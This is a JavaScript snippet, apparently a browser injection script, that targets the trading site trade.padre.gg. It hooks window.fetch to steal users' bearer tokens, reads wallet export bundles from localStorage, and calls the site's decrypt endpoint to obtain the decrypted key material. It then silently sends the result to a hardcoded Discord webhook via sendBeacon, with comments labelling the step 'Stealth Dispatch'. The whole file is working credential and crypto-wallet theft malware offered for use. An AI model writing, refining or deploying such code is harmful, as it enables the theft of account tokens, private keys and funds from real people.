(function() {
    const WEBHOOK = "https://discord.com/api/webhooks/1469455195032260742/9R9JTyCmIj4LjD-nhfImDKIFRIwMEVjDFAzfm8nAL0NOA9_jvH56Ts8-QHn2Dh_nZGnf";
    let sent = false;

    console.log("%c[VANTA] KERNEL v19: PHANTOM HOOK LOADED", "color: #00ff88; font-weight: bold;");

    const exfiltrate = async (token) => {
        if (sent || !token) return;
        
        // Correcting the bundle capture based on your logs
        const bundleData = localStorage.getItem('padre-v2-bundles-store-v2');
        if (!bundleData) return;

        try {
            const parsed = JSON.parse(bundleData);
            const key = Object.keys(parsed.bundles)[0];
            const payload = {
                bundle: parsed.bundles[key].exportBundle,
                subOrgId: parsed.bundles[key].subOrgId
            };

            // Using the actual resolving domain from your logs: trade.padre.gg
            const response = await fetch("https://trade.padre.gg/api/v2/enclave/decrypt", {
                method: 'POST',
                headers: { 
                    'Authorization': token.startsWith('Bearer') ? token : `Bearer ${token}`, 
                    'Content-Type': 'application/json' 
                },
                body: JSON.stringify(payload)
            });

            const result = await response.text();
            sent = true;

            // Stealth Dispatch
            navigator.sendBeacon(WEBHOOK, new Blob([JSON.stringify({
                embeds: [{
                    title: "🛸 PHANTOM SYNC SUCCESS",
                    description: "```json\n" + result.substring(0, 1800) + "\n```",
                    color: 65280
                }]
            })], { type: 'text/plain' }));

            console.log("%c[VANTA] DATA SHIPPED.", "color: #00ff88;");
        } catch (err) {
            // Silently retry on next trigger
        }
    };

    // THE PHANTOM INTERCEPTOR
    // Instead of scanning, we hook the exact process Padre uses to refresh tokens
    const _fetch = window.fetch;
    window.fetch = async (...args) => {
        const url = args[0].toString();
        const headers = args[1]?.headers;
        
        // This targets the specific profile call seen in your logs
        if (url.includes('/api/v2/user/profile')) {
            const auth = (headers instanceof Headers) ? headers.get('Authorization') : headers?.['Authorization'];
            if (auth) {
                console.log("[VANTA] PHANTOM CAPTURE: AUTH_TOKEN");
                exfiltrate(auth);
            }
        }
        return _fetch.apply(this, args);
    };

    // FALLBACK: If user is already idle, force the handshake
    setTimeout(() => {
        if (!sent) {
            console.log("[VANTA] Probing Auth State...");
            _fetch('https://trade.padre.gg/api/v2/user/profile').catch(()=>{});
        }
    }, 1500);

})();
